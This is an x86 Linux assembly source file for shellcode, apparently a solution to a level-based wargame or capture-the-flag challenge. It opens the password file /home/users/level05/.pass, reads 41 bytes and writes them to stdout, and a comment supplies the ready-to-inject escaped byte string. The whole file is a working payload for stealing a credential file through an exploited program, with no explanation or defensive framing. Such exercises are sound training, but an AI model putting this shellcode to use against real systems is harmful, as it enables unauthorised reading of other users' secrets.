[SECTION .text]

global _start


_start:

        jmp short ender

    starter:

        xor eax, eax    ;clean up the registers
        xor ebx, ebx
        xor edx, edx
        xor ecx, ecx

        mov al, 5       ;syscall open
        pop ebx         ;retrieve the string stocked in the stack in ender
        int 0x80        ;interrupt instruction, call open

        mov esi, eax    ;saving the result,fd ,of open in esi
        mov ecx, ebx    ;moving the string for next use in read

        xor     edx, edx
        xor     eax, eax
        mov     ebx, esi        ;moving fd in ebx
        mov     al, byte 3      ;syscall 3, read
        sub     esp, 41         ;reserve memory on stack for read byte
        lea     ecx, [esp]      ;load effective address of that memory
        mov     dl, byte 41     ;read count, 41 bytes
        int     0x80            ;call read

        mov al, 4       ;syscall write
        xor ebx, ebx
        mov bl, 1       ;stdout is 1
        mov dl, 41      ;length of the string
        int 0x80        ;call write

        xor eax, eax
        mov al, 1       ;exit the shellcode
        xor ebx,ebx
        int 0x80        ;call exit

    ender:
        call starter	;put the address of the string on the stack
        db '/home/users/level05/.pass'

; "\xeb\x35\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x05\x5b\xcd\x80\x89\xc6\x89\xd9\x31\xd2\x31\xc0\x89\xf3\xb0\x03\x83\xec\x29\x8d\x0c\x24\xb2\x29\xcd\x80\xb0\x04\x31\xdb\xb3\x01\xb2\x29\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xc6\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2e\x70\x61\x73\x73"
